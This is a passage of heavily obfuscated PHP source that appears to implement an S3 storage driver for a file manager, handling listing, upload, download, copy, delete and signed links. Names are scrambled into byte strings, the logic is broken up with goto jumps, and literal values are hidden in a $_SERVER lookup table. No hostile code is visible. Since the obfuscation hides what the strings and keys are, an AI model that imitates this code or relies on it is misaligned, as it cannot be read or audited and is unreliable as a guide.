$a”ÆöÆ¸îÅ =& $_SERVER[›èö’ù¤]; $dŞ‘‰”ôŠò = $this->listPath($A™Ò‘…—æÎ, !0); $dŞ‘‰”ôŠò = array_merge($dŞ‘‰”ôŠò[$a”ÆöÆ¸îÅ[75]], $dŞ‘‰”ôŠò[$a”ÆöÆ¸îÅ[74]]); goto E×é‡Ïßš£; cƒ¹±¿ƒšß: return $EÓÅ¿åñŸ˜; goto dˆëíğ ôø; c«ƒ©‡¾öİ: $e¼ñÉ©ÙÇŞ = substr($cÀ’Â¼Ô¾İ, 0, strlen($cÀ’Â¼Ô¾İ) - strlen($EÕÈØ´)); $EÓÅ¿åñŸ˜ = $e¼ñÉ©ÙÇŞ . "\x28\x30\51{$EÕÈØ´}"; for ($C’†‹ˆ£òÁ = 1; $C’†‹ˆ£òÁ <= count($e°××—„ƒ®) + 1; $C’†‹ˆ£òÁ++) { $EÓÅ¿åñŸ˜ = $e¼ñÉ©ÙÇŞ . "\50{$C’†‹ˆ£òÁ}\51{$EÕÈØ´}"; if (!in_array_not_case($EÓÅ¿åñŸ˜, $e°××—„ƒ®)) { return $EÓÅ¿åñŸ˜; } } goto cƒ¹±¿ƒšß; E×é‡Ïßš£: $e°××—„ƒ® = array_to_keyvalue($dŞ‘‰”ôŠò, $a”ÆöÆ¸îÅ[33], $a”ÆöÆ¸îÅ[28]); $EÕÈØ´ = $a”ÆöÆ¸îÅ[95] . get_path_ext($cÀ’Â¼Ô¾İ); $EÕÈØ´ = $EÕÈØ´ == $a”ÆöÆ¸îÅ[95] || $Fäš¹¢Ü ? $a”ÆöÆ¸îÅ[33] : $EÕÈØ´; goto c«ƒ©‡¾öİ; dˆëíğ ôø: } public function listAllFiles($E¹å‡¯É¥¼, $c†Áš©Ìö , $C÷öˆ°ù®Ğ = array()) { goto D¤«öäÑä; D¤«öäÑä: $F§îŒ¨ÀÌµ =& $_SERVER[›èö’ù¤]; if (empty($c†Áš©Ìö )) { return array(); } $D¨øœù·è = array(); goto Aô±°˜ÄÒ; EÂøèáôõ‚: foreach (array_unique($D¨øœù·è) as $cùÂ¡°º) { $E™¥«ˆì¼Ï = array($F§îŒ¨ÀÌµ[76] => $this->getPathOuter($F§îŒ¨ÀÌµ[8] . $E¹å‡¯É¥¼ . $F§îŒ¨ÀÌµ[8] . $cùÂ¡°º), $F§îŒ¨ÀÌµ[77] => 1, $F§îŒ¨ÀÌµ[78] => 0); if (substr($cùÂ¡°º, -1) != $F§îŒ¨ÀÌµ[8]) { $E™¥«ˆì¼Ï[$F§îŒ¨ÀÌµ[77]] = 0; $BœÅ–Ìšœ› = $this->getPath($E¹å‡¯É¥¼ . $F§îŒ¨ÀÌµ[8] . $cùÂ¡°º); $E™¥«ˆì¼Ï[$F§îŒ¨ÀÌµ[78]] = isset($C÷öˆ°ù®Ğ[$BœÅ–Ìšœ›]) ? $C÷öˆ°ù®Ğ[$BœÅ–Ìšœ›] : $this->size($BœÅ–Ìšœ›); } $Fªåˆ¶¯“•[] = $E™¥«ˆì¼Ï; } return $Fªåˆ¶¯“•; goto CÂì·´Šà¬; Aô±°˜ÄÒ: $E¹å‡¯É¥¼ = trim($E¹å‡¯É¥¼, $F§îŒ¨ÀÌµ[8]); foreach ($c†Áš©Ìö  as $cùÂ¡°º) { $CÛ²–Ï›³Š = ltrim(substr(trim($cùÂ¡°º, $F§îŒ¨ÀÌµ[8]), strlen($E¹å‡¯É¥¼)), $F§îŒ¨ÀÌµ[8]); $D¨øœù·è = array_merge($D¨øœù·è, $this->slicePath($CÛ²–Ï›³Š)); } $Fªåˆ¶¯“• = array(); goto EÂøèáôõ‚; CÂì·´Šà¬: } public function slicePath($E«áøãïÒÄ) { $aï¢Œ°¸ï” =& $_SERVER[›èö’ù¤]; $dÜ”àƒß™Í = explode($aï¢Œ°¸ï”[8], trim($E«áøãïÒÄ, $aï¢Œ°¸ï”[8])); $Cê‡‘¦ÆÚ¦ = 0; do { ++$Cê‡‘¦ÆÚ¦; $Fí‡­‡¿î„[] = implode($aï¢Œ°¸ï”[8], array_slice($dÜ”àƒß™Í, 0, $Cê‡‘¦ÆÚ¦)) . $aï¢Œ°¸ï”[8]; } while ($Cê‡‘¦ÆÚ¦ < count($dÜ”àƒß™Í)); $Fí‡­‡¿î„[count($dÜ”àƒß™Í) - 1] = $E«áøãïÒÄ; return $Fí‡­‡¿î„; } public function getHost() { $BŒ”˜”ÌÃ± =& $_SERVER[›èö’ù¤]; $aÛö¹¨©ï = parse_url(trim($this->domain, $BŒ”˜”ÌÃ±[8])); $DöòŠƒÀİ = isset($aÛö¹¨©ï[$BŒ”˜”ÌÃ±[174]]) ? $aÛö¹¨©ï[$BŒ”˜”ÌÃ±[174]] : http_type(); $cÙŸñ­­Ä³ = isset($aÛö¹¨©ï[$BŒ”˜”ÌÃ±[175]]) ? $aÛö¹¨©ï[$BŒ”˜”ÌÃ±[175]] : $aÛö¹¨©ï[$BŒ”˜”ÌÃ±[76]]; if (isset($aÛö¹¨©ï[$BŒ”˜”ÌÃ±[176]])) { $cÙŸñ­­Ä³ .= $BŒ”˜”ÌÃ±[4] . $aÛö¹¨©ï[$BŒ”˜”ÌÃ±[176]]; } return $DöòŠƒÀİ . $BŒ”˜”ÌÃ±[177] . $cÙŸñ­­Ä³; } public function pathEncode($D¸óìİ…ö) { $DÙ›¸›À“ =& $_SERVER[›èö’ù¤]; return str_replace($DÙ›¸›À“[178], $DÙ›¸›À“[8], rawurlencode($D¸óìİ…ö)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($Fƒ¹†œ­óÒ) { set_timeout(); require_once SDK_DIR . $_SERVER[›èö’ù¤][179]; parent::__construct(); $this->_init($Fƒ¹†œ­óÒ); } public function _init($Eˆ’¥¹åŞ®) { foreach ($Eˆ’¥¹åŞ® as $Dá¹ë‡¬×” => $cˆŠ­ñ•ù†) { if (isset($this->{$Dá¹ë‡¬×”})) { $this->{$Dá¹ë‡¬×”} = $cˆŠ­ñ•ù†; } } $this->endpoint = $Eˆ’¥¹åŞ®[$_SERVER[›èö’ù¤][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($bœÔšÇˆ® = "\166\x34") { $this->signVer = $bœÔšÇˆ®; $this->client->setSignatureVersion($bœÔšÇˆ®); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto a……ƒœš¨’; A„‡À©Á®: $d¶ÌùöĞË§ = array($B¥óÊîŠ‡ƒ[186], $B¥óÊîŠ‡ƒ[187], $B¥óÊîŠ‡ƒ[188], $B¥óÊîŠ‡ƒ[189], $B¥óÊîŠ‡ƒ[190]); $dƒ¦•‡àá = array_diff($d¶ÌùöĞË§, $d„ö ›¿ë‹); return empty($dƒ¦•‡àá); goto aßÎŸ¯‹»Õ; aËËíÉÅÙô: if ($A†ö¢Á”ä[$B¥óÊîŠ‡ƒ[181]] != $B¥óÊîŠ‡ƒ[182] || $A†ö¢Á”ä[$B¥óÊîŠ‡ƒ[183]] != $B¥óÊîŠ‡ƒ[182]) { return !1; } $d„ö ›¿ë‹ = array_map($B¥óÊîŠ‡ƒ[184], $A†ö¢Á”ä[$B¥óÊîŠ‡ƒ[185]]); if (!is_array($d„ö ›¿ë‹)) { $d„ö ›¿ë‹ = array(); } goto A„‡À©Á®; a……ƒœš¨’: $B¥óÊîŠ‡ƒ =& $_SERVER[›èö’ù¤]; $A†ö¢Á”ä = $this->getBucketCors(); if (!$A†ö¢Á”ä || !is_array($A†ö¢Á”ä)) { return !1; } goto aËËíÉÅÙô; aßÎŸ¯‹»Õ: } public function mkfile($FŞŒøŞĞ«¥, $CÉ•ö·•¢ = '', $E Ğ‰„ø‰Ö = REPEAT_RENAME) { $fˆ›·—ôó = $this->setContent($FŞŒøŞĞ«¥, $CÉ•ö·•¢); if ($fˆ›·—ôó !== !1) { return $this->getPathOuter($FŞŒøŞĞ«¥); } return !1; } public function mkdir($eÇëÑèÅÙÎ, $bƒÙ—äÍí’ = REPEAT_SKIP) { $Eœ¨°¦šÃ¤ =& $_SERVER[›èö’ù¤]; if (empty($eÇëÑèÅÙÎ) && $eÇëÑèÅÙÎ !== $Eœ¨°¦šÃ¤[191]) { return !1; } if ($this->_isFolder($eÇëÑèÅÙÎ)) { return $this->getPathOuter($eÇëÑèÅÙÎ); } $CŸƒ” ø© = $this->setContent($eÇëÑèÅÙÎ, $Eœ¨°¦šÃ¤[33], !0); if ($CŸƒ” ø© !== !1) { return $this->getPathOuter($eÇëÑèÅÙÎ); } return !1; } public function copyFile($C»ê‹ËÜâò, $d¥Á‰áÛñî, $eß½Ñè¾ñµ = array()) { $cÚòĞÒÄË =& $_SERVER[›èö’ù¤]; $A½ ›Õ » = $this->objectMeta($C»ê‹ËÜâò); if (!$A½ ›Õ ») { return !1; } if ($A½ ›Õ »[$cÚòĞÒÄË[78]] <= 1024 * 1024 * 200) { $C¹éôÚ«²Ÿ = $this->client->copyObject($this->bucket, $C»ê‹ËÜâò, $this->bucket, $d¥Á‰áÛñî, $cÚòĞÒÄË[192], $eß½Ñè¾ñµ); } else { $C¹éôÚ«²Ÿ = $this->client->multiCopyObject($this->bucket, $C»ê‹ËÜâò, $this->bucket, $d¥Á‰áÛñî, $eß½Ñè¾ñµ); } $C¹éôÚ«²Ÿ = $C¹éôÚ«²Ÿ ? $this->getPathOuter($d¥Á‰áÛñî) : !1; return $C¹éôÚ«²Ÿ; } public function moveFile($FÑñ«ªÖò‚, $eßĞ§ˆ »ñ) { if ($this->copyFile($FÑñ«ªÖò‚, $eßĞ§ˆ »ñ)) { $this->delFile($FÑñ«ªÖò‚); return $this->getPathOuter($eßĞ§ˆ »ñ); } return !1; } public function delFile($d’Œ¯ùÛëŸ) { return $this->client->deleteObject($this->bucket, $d’Œ¯ùÛëŸ); } public function delFolder($AÌÑÓò‡) { goto cÊ¢”Ê ‚Ö; CÈ´ƒµ«õ: if (!empty($AÌÑÓò‡) && $AÌÑÓò‡ !== $fŠ‹‚µ²ƒ›[191] && !in_array($DÕ²ÄñÆŒÉ, $AäƒÑ—Éø¯[$fŠ‹‚µ²ƒ›[75]])) { $AäƒÑ—Éø¯[$fŠ‹‚µ²ƒ›[75]][] = $DÕ²ÄñÆŒÉ; } $d÷Î» šÏÑ = $this->delByBatch($AäƒÑ—Éø¯[$fŠ‹‚µ²ƒ›[74]]); if (!$d÷Î» šÏÑ) { return !1; } goto Bé§»—÷«…; b«øèåñÔš: $AäƒÑ—Éø¯ = $this->fileList($AÌÑÓò‡); $this->listItemCache = !0; $DÕ²ÄñÆŒÉ = trim($AÌÑÓò‡, $fŠ‹‚µ²ƒ›[8]) . $fŠ‹‚µ²ƒ›[8]; goto CÈ´ƒµ«õ; cÊ¢”Ê ‚Ö: $fŠ‹‚µ²ƒ› =& $_SERVER[›èö’ù¤]; if (!$this->exist($AÌÑÓò‡)) { return !0; } $this->listItemCache = !1; goto b«øèåñÔš; Bé§»—÷«…: $d÷Î» šÏÑ = $this->delByBatch($AäƒÑ—Éø¯[$fŠ‹‚µ²ƒ›[75]]); if (!$d÷Î» šÏÑ) { return !1; } return $this->delFile($DÕ²ÄñÆŒÉ); goto e±óäÜö„¸; e±óäÜö„¸: } private function delByBatch($fß¨°•Î¢¸) { foreach (array_chunk($fß¨°•Î¢¸, 1000) as $aŠ¹•‘Ï¨) { $c¼ğ£„Ú¬Ş = $this->client->deleteObjects($this->bucket, $aŠ¹•‘Ï¨); if (!$c¼ğ£„Ú¬Ş) { return !1; } } return !0; } public function rename($B£ñ¼ø”—º, $b…»âÃ…¢ò) { return $this->renameObject($B£ñ¼ø”—º, $b…»âÃ…¢ò); } public function listPath($a¦š¤™÷µÓ, $fĞ©ˆ¨ªÒÄ = false) { $F‹’ä¾ŞÑ =& $_SERVER[›èö’ù¤]; $D£áÚÇ£° = $this->fileList($a¦š¤™÷µÓ, $F‹’ä¾ŞÑ[8], !0); foreach ($D£áÚÇ£°[$F‹’ä¾ŞÑ[75]] as $D¶µ¡¢Àˆ => $f‘ñïÊùƒÆ) { $D£áÚÇ£°[$F‹’ä¾ŞÑ[75]][$D¶µ¡¢Àˆ] = $this->folderInfo($f‘ñïÊùƒÆ, $fĞ©ˆ¨ªÒÄ); } foreach ($D£áÚÇ£°[$F‹’ä¾ŞÑ[74]] as $D¶µ¡¢Àˆ => $f‘ñïÊùƒÆ) { $D£áÚÇ£°[$F‹’ä¾ŞÑ[74]][$D¶µ¡¢Àˆ] = $this->fileInfo($f‘ñïÊùƒÆ[$F‹’ä¾ŞÑ[28]], $fĞ©ˆ¨ªÒÄ, $f‘ñïÊùƒÆ); } return $D£áÚÇ£°; } private function fileInfo($Cí¨ÏÎ†œ”, $cñ·ø¹ªó¿ = false, $A©²¶ï§Â± = array()) { goto C¿æçÈóÕ•; FØ¬™ÈŞ´Ê: if (isset($A©²¶ï§Â±[$E’¾äİÖ¶Ÿ[197]])) { $Aº£íã »[$E’¾äİÖ¶Ÿ[84]] = $A©²¶ï§Â±[$E’¾äİÖ¶Ÿ[197]]; } if (isset($A©²¶ï§Â±[$E’¾äİÖ¶Ÿ[78]])) { $Aº£íã »[$E’¾äİÖ¶Ÿ[78]] = $A©²¶ï§Â±[$E’¾äİÖ¶Ÿ[78]]; } return $Aº£íã »; goto D‹¦Ÿˆùßå; eÔöìº: $Aº£íã »[$E’¾äİÖ¶Ÿ[194]] = $Aº£íã »[$E’¾äİÖ¶Ÿ[84]] = 0; $Aº£íã »[$E’¾äİÖ¶Ÿ[195]] = $Aº£íã »[$E’¾äİÖ¶Ÿ[196]] = !0; if (empty($A©²¶ï§Â±)) { $A©²¶ï§Â± = $this->objectMeta($Cí¨ÏÎ†œ”); if (!$A©²¶ï§Â±) { return $Aº£íã »; } } goto FØ¬™ÈŞ´Ê; C¿æçÈóÕ•: $E’¾äİÖ¶Ÿ =& $_SERVER[›èö’ù¤]; $Aº£íã » = array($E’¾äİÖ¶Ÿ[28] => $this->pathThis($Cí¨ÏÎ†œ”), $E’¾äİÖ¶Ÿ[76] => $this->getPathOuter($Cí¨ÏÎ†œ”), $E’¾äİÖ¶Ÿ[29] => $E’¾äİÖ¶Ÿ[193], $E’¾äİÖ¶Ÿ[168] => $this->ext($Cí¨ÏÎ†œ”), $E’¾äİÖ¶Ÿ[78] => isset($A©²¶ï§Â±[$E’¾äİÖ¶Ÿ[78]]) ? $A©²¶ï§Â±[$E’¾äİÖ¶Ÿ[78]] : 0); if ($cñ·ø¹ªó¿) { return $Aº£íã »; } goto eÔöìº; D‹¦Ÿˆùßå: } private function folderInfo($CÄïøñŞïŸ, $Eµ¨œÁù‡Á = false) { goto c›ğÍë‚; c›ğÍë‚: $C¬ƒ±ö³Ùä =& $_SERVER[›èö’ù¤]; $c²‰šíççó = array($C¬ƒ±ö³Ùä[28] => $this->pathThis($CÄïøñŞïŸ), $C¬ƒ±ö³Ùä[76] => $this->getPathOuter($C¬ƒ±ö³Ùä[8] . $CÄïøñŞïŸ), $C¬ƒ±ö³Ùä[29] => $C¬ƒ±ö³Ùä[77]); if ($Eµ¨œÁù‡Á) { return $c²‰šíççó; } goto câöœë®³æ; bã©‰¤…ÌŠ: return $c²‰šíççó; goto AŒÂÕ×­à‚; D½¥¡Øƒ¤î: $CÄïøñŞïŸ = trim($CÄïøñŞïŸ, $C¬ƒ±ö³Ùä[8]) . $C¬ƒ±ö³Ùä[8]; $B«¹ï‰™®ˆ = $this->objectMeta($CÄïøñŞïŸ); if (isset($B«¹ï‰™®ˆ[$C¬ƒ±ö³Ùä[197]])) { $c²‰šíççó[$C¬ƒ±ö³Ùä[194]] = $B«¹ï‰™®ˆ[$C¬ƒ±ö³Ùä[197]]; } goto bã©‰¤…ÌŠ; câöœë®³æ: $c²‰šíççó[$C¬ƒ±ö³Ùä[194]] = $c²‰šíççó[$C¬ƒ±ö³Ùä[84]] = 0; $c²‰šíççó[$C¬ƒ±ö³Ùä[195]] = $c²‰šíççó[$C¬ƒ±ö³Ùä[196]] = !0; if ($CÄïøñŞïŸ == $C¬ƒ±ö³Ùä[33]) { return $c²‰šíççó; } goto D½¥¡Øƒ¤î; AŒÂÕ×­à‚: } private function fileList($dîùó·—, $E†ªÕ¤‹´ = '', $d‡Ÿ¸ÆŸ = 0) { goto fãï–ÆÉëİ; CŒÚ„ˆ²¢‰: if (!$B«Â†ğ×¡ğ) { return array($A£ÕùØ¶”ø[75] => array(), $A£ÕùØ¶”ø[74] => array()); } $eˆÅŒ·õ…» = $this->listItemCache === !1 ? !1 : !0; $Dõ’øƒ´« = $b¤áÀÎÅÉ½ = array(); goto A­Şì´¹¤…; f‚Í°Ã³‡ô: return array($A£ÕùØ¶”ø[75] => $Dõ’øƒ´«, $A£ÕùØ¶”ø[74] => $b¤áÀÎÅÉ½); goto aˆÄìñğ£; fãï–ÆÉëİ: $A£ÕùØ¶”ø =& $_SERVER[›èö’ù¤]; $cÈÑ¡Ìƒ“ˆ = rtrim($dîùó·—, $A£ÕùØ¶”ø[8]) . $A£ÕùØ¶”ø[8]; $B«Â†ğ×¡ğ = $this->listObjs($cÈÑ¡Ìƒ“ˆ, null, null, $E†ªÕ¤‹´); goto CŒÚ„ˆ²¢‰; A­Şì´¹¤…: foreach ($B«Â†ğ×¡ğ[$A£ÕùØ¶”ø[198]] as $EË´«£’‡¹) { goto DğÖá—³•Ò; DğÖá—³•Ò: $dÑ°Ô¬•“© = $EË´«£’‡¹[$A£ÕùØ¶”ø[28]]; if ($dÑ°Ô¬•“© == $cÈÑ¡Ìƒ“ˆ) { continue; } $cËÁæ¾¤ª† = isset($EË´«£’‡¹[$A£ÕùØ¶”ø[78]]) ? $EË´«£’‡¹[$A£ÕùØ¶”ø[78]] : 0; goto Dš‹Ú½ØãÔ; Dš‹Ú½ØãÔ: $d÷–¡·àì = $cËÁæ¾¤ª† == 0 && substr($dÑ°Ô¬•“©, strlen($dÑ°Ô¬•“©) - 1, 1) == $A£ÕùØ¶”ø[8] ? !0 : !1; if ($eˆÅŒ·õ…») { $this->cacheMethod($A£ÕùØ¶”ø[199], $dÑ°Ô¬•“©, $d÷–¡·àì); $this->cacheMethod($A£ÕùØ¶”ø[200], $dÑ°Ô¬•“©, $EË´«£’‡¹); } if ($d÷–¡·àì) { $Dõ’øƒ´«[] = $dÑ°Ô¬•“©; continue; } goto f®Ôî¨¬¹Æ; f®Ôî¨¬¹Æ: $b¤áÀÎÅÉ½[] = $d‡Ÿ¸ÆŸ ? $EË´«£’‡¹ : $dÑ°Ô¬•“©; goto Aâãñ¬Ó£—; Aâãñ¬Ó£—: } foreach ($B«Â†ğ×¡ğ[$A£ÕùØ¶”ø[201]] as $EË´«£’‡¹) { $Dõ’øƒ´«[] = $EË´«£’‡¹[$A£ÕùØ¶”ø[28]]; if ($eˆÅŒ·õ…») { $this->cacheMethod($A£ÕùØ¶”ø[199], $EË´«£’‡¹[$A£ÕùØ¶”ø[28]], !0); } } if ($eˆÅŒ·õ…») { $this->cacheMethod($A£ÕùØ¶”ø[199], $dîùó·—, !0); } goto f‚Í°Ã³‡ô; aˆÄìñğ£: } private function listObjs($FñÌ÷îˆ¶’, $EñØŒ­æÓÛ = null, $fñÄØè”£‘ = null, $EˆËæ¬Æ„ = null) { $dë“ŸÉ­¥ =& $_SERVER[›èö’ù¤]; $FñÌ÷îˆ¶’ = trim($FñÌ÷îˆ¶’, $dë“ŸÉ­¥[8]); $C²•¿Ğ•„‘ = empty($FñÌ÷îˆ¶’) && $FñÌ÷îˆ¶’ !== $dë“ŸÉ­¥[191] ? $dë“ŸÉ­¥[33] : $FñÌ÷îˆ¶’ . $dë“ŸÉ­¥[8]; return $this->client->getBucket($this->bucket, $C²•¿Ğ•„‘, $EñØŒ­æÓÛ, $fñÄØè”£‘, $EˆËæ¬Æ„, !0); } public function has($fìá®ŒĞù, $BÉóª–ñ­ = false, $B†æù²ŞŸÂ = true) { goto fË©Î†öÃÚ; AÜ¿ã‰Ó°Æ: $AÜøËªŞ¡ = $F‰®ÇÕôÓ = array(); while (!0) { $aÜ¤ÃÁÈ• = $this->listObjs($fìá®ŒĞù, $F¹Õñá‘Ü•, $a¿»¢¦òƒ©, $Bã”ô†ã­¶); if (!$aÜ¤ÃÁÈ•) { break; } $F¹Õñá‘Ü• = $aÜ¤ÃÁÈ•[$A©ğáƒ¸§Î[202]]; $C†É÷í¹” = $aÜ¤ÃÁÈ•[$A©ğáƒ¸§Î[198]]; $B„‹î¹Ìó— = $aÜ¤ÃÁÈ•[$A©ğáƒ¸§Î[201]]; if (empty($C†É÷í¹”) && empty($B„‹î¹Ìó—)) { break; } if (count($C†É÷í¹”) == 1 && $C†É÷í¹”[0][$A©ğáƒ¸§Î[28]] == $F¹Úù ŠÇ’) { break; } if ($BÉóª–ñ­) { if (count($C†É÷í¹”)) { $C†É÷í¹” = array_column($C†É÷í¹”, $A©ğáƒ¸§Î[28]); $AÜøËªŞ¡ = array_merge($AÜøËªŞ¡, $C†É÷í¹”); } if (count($B„‹î¹Ìó—)) { $B„‹î¹Ìó— = array_column($B„‹î¹Ìó—, $A©ğáƒ¸§Î[28]); $F‰®ÇÕôÓ = array_merge($F‰®ÇÕôÓ, $B„‹î¹Ìó—); } if ($F¹Õñá‘Ü• === null) { break; } continue; } if ($B†æù²ŞŸÂ) { if (!empty($C†É÷í¹”)) { if (count($C†É÷í¹”) > 1 || isset($C†É÷í¹”[0][$A©ğáƒ¸§Î[28]]) && $C†É÷í¹”[0][$A©ğáƒ¸§Î[28]] != $F¹Úù ŠÇ’) { return !0; } } } else { if (!empty($B„‹î¹Ìó—)) { return !0; } } if ($F¹Õñá‘Ü• === null) { break; } } if ($BÉóª–ñ­) { $AÜøËªŞ¡ = array_diff($AÜøËªŞ¡, array($F¹Úù ŠÇ’)); $AÜøËªŞ¡ = count(array_unique($AÜøËªŞ¡)); $F‰®ÇÕôÓ = count(array_unique($F‰®ÇÕôÓ)); return array($A©ğáƒ¸§Î[203] => $AÜøËªŞ¡, $A©ğáƒ¸§Î[204] => $F‰®ÇÕôÓ); } goto e¸ê¹î»Ü; fË©Î†öÃÚ: $A©ğáƒ¸§Î =& $_SERVER[›èö’ù¤]; $fìá®ŒĞù = trim($fìá®ŒĞù, $A©ğáƒ¸§Î[8]); $F¹Úù ŠÇ’ = empty($fìá®ŒĞù) && $fìá®ŒĞù !== $A©ğáƒ¸§Î[191] ? $A©ğáƒ¸§Î[33] : $fìá®ŒĞù . $A©ğáƒ¸§Î[8]; goto d•Ñêİ³Úµ; e¸ê¹î»Ü: return !1; goto d²±¸°±¨; d•Ñêİ³Úµ: $F¹Õñá‘Ü• = null; $a¿»¢¦òƒ© = 500; $Bã”ô†ã­¶ = $A©ğáƒ¸§Î[8]; goto AÜ¿ã‰Ó°Æ; d²±¸°±¨: } public function listAll($AÂ¶‚…Ì„‚) { $fß™­ø­è =& $_SERVER[›èö’ù¤]; $d“î‹Ù–Ôƒ = $this->fileList($AÂ¶‚…Ì„‚, $fß™­ø­è[33], !0); $b‚±Í¡çŠò = array(); foreach ($d“î‹Ù–Ôƒ[$fß™­ø­è[74]] as $Få†š²Ñ’) { $b‚±Í¡çŠò[$Få†š²Ñ’[$fß™­ø­è[28]]] = $Få†š²Ñ’[$fß™­ø­è[78]]; } foreach ($d“î‹Ù–Ôƒ[$fß™­ø­è[75]] as $Få†š²Ñ’) { if (is_string($Få†š²Ñ’)) { $b‚±Í¡çŠò[$Få†š²Ñ’] = 0; } } return $this->listAllFiles($AÂ¶‚…Ì„‚, array_keys($b‚±Í¡çŠò), $b‚±Í¡çŠò); } public function canRead($cãËõíÇÁ) { $aŸ„‘ÌÒ =& $_SERVER[›èö’ù¤]; $e›§ƒÙ¾ÉÊ = $this->client->getAccessControlPolicy($this->bucket, $cãËõíÇÁ); if (!$e›§ƒÙ¾ÉÊ) { return !1; } return in_array($e›§ƒÙ¾ÉÊ, array($aŸ„‘ÌÒ[205], $aŸ„‘ÌÒ[206], $aŸ„‘ÌÒ[207])) ? !0 : !1; } public function canWrite($dÔ¯ó÷Ù…) { $e±º‹Ôõˆ =& $_SERVER[›èö’ù¤]; $D˜õŒ„Ä‹å = $this->client->getAccessControlPolicy($this->bucket, $dÔ¯ó÷Ù…); if (!$D˜õŒ„Ä‹å) { return !1; } return in_array($D˜õŒ„Ä‹å, array($e±º‹Ôõˆ[205], $e±º‹Ôõˆ[206])) ? !0 : !1; } public function getContent($F’£Ÿ«×Œ) { return $this->client->getObject($this->bucket, $F’£Ÿ«×Œ); } public function setContent($D½“©’‰Œß, $aç²öÒÈï = '', $DÏ°âí’‚× = false) { goto bŒ“¥Øù¾Ú; CÓË‘îÃ±¯: $Fœçª™õäÆ = $this->client->putObject($aç²öÒÈï, $this->bucket, $D½“©’‰Œß, $c›¼ÄİºÙ¤[192], array(), $c·Ü —‡‚†); if (!$Fœçª™õäÆ) { return !1; } if ($DÏ°âí’‚×) { return !0; } goto dƒ´™« ‚; bŒ“¥Øù¾Ú: $c›¼ÄİºÙ¤ =& $_SERVER[›èö’ù¤]; $D½“©’‰Œß = $DÏ°âí’‚× ? trim($D½“©’‰Œß, $c›¼ÄİºÙ¤[8]) . $c›¼ÄİºÙ¤[8] : $D½“©’‰Œß; $c·Ü —‡‚† = get_file_mime(get_path_ext($D½“©’‰Œß)); goto CÓË‘îÃ±¯; dƒ´™« ‚: $this->cacheMethod(null, null); $Fœçª™õäÆ = $this->copyFile($D½“©’‰Œß, $D½“©’‰Œß, array($c›¼ÄİºÙ¤[208] => $Fœçª™õäÆ[$c›¼ÄİºÙ¤[209]])); return $Fœçª™õäÆ ? !0 : !1; goto E–Ú¶ãã‡®; E–Ú¶ãã‡®: } public function fileSubstr($B†¿ƒ’ÊÔµ, $e•…ÌÏ•¹, $CÍá–Ü³£) { $E™Àà„Ñ’Á = $e•…ÌÏ•¹ + $CÍá–Ü³£ - 1; return $this->client->getObject($this->bucket, $B†¿ƒ’ÊÔµ, array($_SERVER[›èö’ù¤][210] => "\x62\171\x74\x65\x73\x3d{$e•…ÌÏ•¹}\x2d{$E™Àà„Ñ’Á}")); } public function upload($EŠâ³µãÙ­, $EŸïÔ¼éÜ, $D”®îøõ¼Û = false, $dÓ‡³¦Ã®ß = REPEAT_REPLACE) { $A“ğ¹ÜÌ²¸ =& $_SERVER[›èö’ù¤]; $Dï˜‚ˆ‰Úâ = array($A“ğ¹ÜÌ²¸[208] => @md5_file($EŸïÔ¼éÜ)); $f¿®îîå½† = array($A“ğ¹ÜÌ²¸[211] => get_file_mime(get_path_ext($EŠâ³µãÙ­))); if (IO::size($EŸïÔ¼éÜ) <= 1024 * 1024 * 200) { $fùç’ç¶ÖÙ = $this->client->putObjectFile($EŸïÔ¼éÜ, $this->bucket, $EŠâ³µãÙ­, $A“ğ¹ÜÌ²¸[192], $Dï˜‚ˆ‰Úâ, $f¿®îîå½†); return !empty($fùç’ç¶ÖÙ) ? $this->getPathOuter($EŠâ³µãÙ­) : !1; } $d®æéÌ°„® = $this->client->multiUploadObject($EŸïÔ¼éÜ, $this->bucket, trim($EŠâ³µãÙ­, $A“ğ¹ÜÌ²¸[8]), $Dï˜‚ˆ‰Úâ, $f¿®îîå½†); return $d®æéÌ°„® ? $this->getPathOuter($EŠâ³µãÙ­) : !1; } public function download($BÔğß¥Å‰Ø, $e¼ï†äÛ¼ğ) { if (!@is_dir($this->pathFather($e¼ï†äÛ¼ğ)) && !IO::mkdir($this->pathFather($e¼ï†äÛ¼ğ))) { return !1; } $AŠ˜‘ŸË·× = $this->client->getObject($this->bucket, $BÔğß¥Å‰Ø, array(), $e¼ï†äÛ¼ğ); return $AŠ˜‘ŸË·× !== !1 ? $e¼ï†äÛ¼ğ : !1; } public function link($CÂİÂéÚ—Ã, $d›Ö„„Şœ‘ = array()) { $B«²Í£†‡Ç =& $_SERVER[›èö’ù¤]; if ($this->signVer == $B«²Í£†‡Ç[212]) { return $this->client->getAuthenticatedURL($this->bucket, $CÂİÂéÚ—Ã, 3600 * 12, $d›Ö„„Şœ‘); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($CÂİÂéÚ—Ã, $B«²Í£†‡Ç[8]), 3600 * 12, $this->region, array(), !0, $d›Ö„„Şœ‘); } public function fileOut($a½ô…²ÀŠœ, $Bª¡¸Ö¶½¨ = false, $b„²‹÷ùºÍ = false, $c‘‡–ÌæºÓ = '') { goto eÅµÁö»ó¾; fÃîÜæ‘¦ì: $DŠèÛšæ¯ó = get_file_mime(get_path_ext($b„²‹÷ùºÍ)); if ($DŠèÛšæ¯ó == $EÔ®•»Çô[213]) { return parent::fileOut($a½ô…²ÀŠœ, $Bª¡¸Ö¶½¨, $b„²‹÷ùºÍ, $c‘‡–ÌæºÓ); } $Bª¡¸Ö¶½¨ = $Bª¡¸Ö¶½¨ ? $EÔ®•»Çô[214] : $EÔ®•»Çô[215]; goto AÛç¶†©ø; eÅµÁö»ó¾: $EÔ®•»Çô =& $_SERVER[›èö’ù¤]; if ($this->isFileOutServer()) { return $this->fileOutServer($a½ô…²ÀŠœ, $Bª¡¸Ö¶½¨, $b„²‹÷ùºÍ, $c‘‡–ÌæºÓ); } if (!$b„²‹÷ùºÍ) { $b„²‹÷ùºÍ = $this->pathThis($a½ô…²ÀŠœ); } goto fÃîÜæ‘¦ì; AÛç¶†©ø: 